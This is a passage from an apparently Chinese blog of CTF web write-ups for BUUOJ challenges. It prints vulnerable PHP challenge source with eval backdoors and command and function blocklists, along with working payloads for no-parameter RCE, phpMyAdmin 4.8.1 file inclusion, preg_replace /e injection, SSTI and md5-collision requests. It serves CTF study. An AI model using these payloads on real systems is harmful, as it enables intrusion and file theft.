class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="built_in">eval</span>($_GET[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                die(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            die(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        die(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>分析后主要有几点</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> 过滤了常用的几个伪协议，不能以伪协议读取文件。</span><br><span class="line"><span class="number">2.</span> (?R)引用当前表达式，后面加了?递归调用。只能匹配通过无参数的函数。</span><br><span class="line"><span class="number">3.</span> 正则匹配掉了et/na/info等关键字，很多函数都用不了。</span><br><span class="line"><span class="number">4.</span> <span class="built_in">eval</span>($_GET[<span class="string">&#x27;exp&#x27;</span>]); 典型的无参数RCE</span><br></pre></td></tr></table></figure><p>构造payload</p><p>考虑scandir(&#39;.&#39;)的形式来获取当前目录下的文件信息。</p><p>localeconv() 函数返回一包含本地数字及货币格式信息的数组。而数组第一项就是.</p><p>current() 返回数组中的当前单元, 默认取第一个值</p><p>于是scandir(&#39;.&#39;)就转化为</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(current(localeconv())));</span><br><span class="line">print_r(scandir(pos(localeconv())));</span><br></pre></td></tr></table></figure><p>但还需要取到我们想要的文件及其内容，就需要以下操作</p><ol><li>array_reverse() 以相反的元素顺序返回数组，再搭配next()处理</li><li>array_flip()交换数组的键和值</li><li>array_rand()从数组中随机取出一个或多个单元，不断刷新访问就会不断随机返回，本题目中scandir()返回的数组只有5个元素，刷新几次就能刷出来flag.php</li></ol><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=print_r(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure><p>以上就可以获取到想要的文件名最后调用highlight_file()、readfile()、show_source()、file_get_contents()（被ban）</p><p>另一种方式可以通过session来处理：</p><p>本题目虽然ban了hex关键字，导致hex2bin()被禁用，但是我们可以并不依赖于十六进制转ASCII的方式，因为flag.php这些字符是PHPSESSID本身就支持的。</p><p>使用session之前需要通过session_start()告诉PHP使用session，php默认是不主动使用session的。</p><p>session_id()可以获取到当前的session id。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=highlight_file(session_id(session_start()));</span><br></pre></td></tr></table></figure><h2 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h2><p>目录扫描到有个phpmyadmin，不需要密码，版本4.8.1，是存在漏洞的版本</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">直接利用文件包含就可以</span><br><span class="line">?target=db_datadict.php%253f/../../../../../../../../../flag‘</span><br><span class="line"></span><br><span class="line">也可以走代码执行，依次执行</span><br><span class="line">show <span class="built_in">global</span> variables like <span class="string">&quot;%datadir%&quot;</span>;</span><br><span class="line"></span><br><span class="line">use test;</span><br><span class="line">CREATE TABLE test(code varchar(<span class="number">100</span>));</span><br><span class="line">INSERT INTO test(code) VALUES(<span class="string">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">?target=db_datadict.php%253f/../../../../../../../../../<span class="keyword">var</span>/lib/mysql/data/test/test.MYD</span><br><span class="line"></span><br><span class="line">或者包含session文件</span><br><span class="line">?target=db_sql.php%253f/../../../../../../../../tmp/sess_cui65j0c7j9mjmu4b76kio81rj</span><br></pre></td></tr></table></figure><p>db_sql.php可以替换成：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;db_datadict.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_sql.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_events.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_export.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_importdocsql.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_multi_table_query.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_structure.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_import.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_operations.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_search.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_routines.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;export.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;import.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;index.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;pdf_pages.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;pdf_schema.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;server_binlog.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;server_collations.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;server_databases.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;server_engines.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;server_export.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;server_import.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;server_privileges.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;server_sql.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;server_status.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;server_status_advisor.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;server_status_monitor.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;server_status_queries.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;server_status_variables.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;server_variables.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;sql.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;tbl_addfield.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;tbl_change.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;tbl_create.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;tbl_import.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;tbl_indexes.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;tbl_sql.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;tbl_export.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;tbl_operations.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;tbl_structure.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;tbl_relation.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;tbl_replace.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;tbl_row_action.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;tbl_select.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;tbl_zoom_select.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;transformation_overview.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;transformation_wrapper.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;user_password.php&#x27;</span>,</span><br></pre></td></tr></table></figure><h2 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h2><p>题目给了源码</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$text = $_GET[<span class="string">&quot;text&quot;</span>];</span><br><span class="line">$file = $_GET[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(isset($text)&amp;&amp;(file_get_contents($text,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;I have a dream&quot;</span>))&#123;</span><br><span class="line">    echo <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents($text,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,$file))&#123;</span><br><span class="line">        die(<span class="string">&quot;Not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    include($file);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>构造包（text=data://text/plain,I%20have%20a%20dream）</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /?text=php:<span class="comment">//input&amp;file=php://filter/convert.base64-encode/resource=next.php HTTP/1.1</span></span><br><span class="line">Host: 0722e0f3-821d-4d78-9dc7-be292c48d6fb.node3.buuoj.cn</span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">91.0</span><span class="number">.4472</span><span class="number">.114</span> Safari/<span class="number">537.36</span></span><br><span class="line"><span class="attr">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Content-Length: 14</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">I have a dream</span></span><br></pre></td></tr></table></figure><p>将拿到的结果base64 decode</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$id = $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">$_SESSION[<span class="string">&#x27;id&#x27;</span>] = $id;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params">$re, $str</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . $re . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        $str</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">foreach</span>(<span class="params">$_GET <span class="keyword">as</span> $re =&gt; $str</span>)</span> &#123;</span><br><span class="line">    echo complex($re, $str). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">@<span class="built_in">eval</span>($_GET[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考<a href="https://blog.csdn.net/weixin_43749601/article/details/113417093">https://blog.csdn.net/weixin_43749601/article/details/113417093</a></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">next.php?\S*=$&#123;system($_GET[x])&#125;&amp;x=cat%<span class="number">20</span>/flag</span><br></pre></td></tr></table></figure><h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><p>flag处回显ip地址的地方SSTI模板注入</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: &#123;&#123;system(<span class="string">&#x27;cat /flag&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p>dirsearch扫描到.git，下载源码</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">$yds = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line">$is = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line">$handsome = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">foreach</span>(<span class="params">$_POST <span class="keyword">as</span> $x =&gt; $y</span>)</span>&#123;</span><br><span class="line">    $$x = $y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">foreach</span>(<span class="params">$_GET <span class="keyword">as</span> $x =&gt; $y</span>)</span>&#123;</span><br><span class="line">    $$x = $$y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">foreach</span>(<span class="params">$_GET <span class="keyword">as</span> $x =&gt; $y</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">&#x27;flag&#x27;</span>] === $x &amp;&amp; $x !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        exit($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!isset($_GET[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !isset($_POST[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    exit($yds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || $_GET[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    exit($is);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo <span class="string">&quot;the flag is: &quot;</span>.$flag;</span><br></pre></td></tr></table></figure><p>$$变量覆盖问题，这里可以利用exit输出，看GET部分的遍历，假如传进的数据为<code>yds=flag</code>，那么就变为了<code>$yds=flag</code>，再通过<code>exit($yds)</code>输出即可。</p><h2 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h2><p>分析链接，两个参数，其中img的值两次base64的值，观察发现是转的ascii(主要是看到了2e)，这里应该有文件包含，转为看index.php(TmprMlpUWTBOalUzT0RKbE56QTJPRGN3)，得到源码</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">$cmd = $_GET[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!isset($_GET[<span class="string">&#x27;img&#x27;</span>]) || !isset($_GET[<span class="string">&#x27;cmd&#x27;</span>])) </span><br><span class="line">    header(<span class="string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">&#x27;img&#x27;</span>])));</span><br><span class="line"></span><br><span class="line">$file = preg_replace(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="string">&quot;&quot;</span>, $file);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/flag/i&quot;</span>, $file)) &#123;</span><br><span class="line">    echo <span class="string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;</span><br><span class="line">    die(<span class="string">&quot;xixi～ no flag&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    echo <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . $txt . <span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line">    echo <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">echo $cmd;</span><br><span class="line">echo <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, $cmd)) &#123;</span><br><span class="line">    echo(<span class="string">&quot;forbid ~&quot;</span>);</span><br><span class="line">    echo <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((string)$_POST[<span class="string">&#x27;a&#x27;</span>] !== (string)$_POST[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; md5($_POST[<span class="string">&#x27;a&#x27;</span>]) === md5($_POST[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        echo <span class="string">`$cmd`</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        echo (<span class="string">&quot;md5 is funny ~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span></span><br><span class="line"><span class="css"><span class="xml">  <span class="selector-tag">body</span>&#123;</span></span></span><br><span class="line"><span class="css"><span class="xml">   <span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">./bj.png</span>)  no-repeat center center;</span></span></span><br><span class="line"><span class="css"><span class="xml">   <span class="attribute">background-size</span>:cover;</span></span></span><br><span class="line"><span class="css"><span class="xml">   <span class="attribute">background-attachment</span>:fixed;</span></span></span><br><span class="line"><span class="css"><span class="xml">   <span class="attribute">background-color</span>:<span class="number">#CCCCCC</span>;</span></span></span><br><span class="line"><span class="css"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="css"><span class="xml"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>md5相关参考</p><p><a href="https://blog.csdn.net/vhkjhwbs/article/details/97618629">https://blog.csdn.net/vhkjhwbs/article/details/97618629</a></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php?cmd=c\at%<span class="number">20</span>/flag HTTP/<span class="number">1.1</span></span><br><span class="line"><span class="attr">Host</span>: f8ed05f8-<span class="number">2e32</span>-<span class="number">4176</span>-9f24-8c89e45aa403.node4.buuoj.cn</span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">91.0</span><span class="number">.4472</span><span class="number">.114</span> Safari/<span class="number">537.36</span></span><br><span class="line"><span class="attr">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Content-Length: 389</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span></span><br></pre></td></tr></table></figure><p>还可以用sort读文件</p><h2 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h2><p>根据包特点构造<code>func=file_get_contents&amp;p=index.php</code></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $disable_fun = array(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span 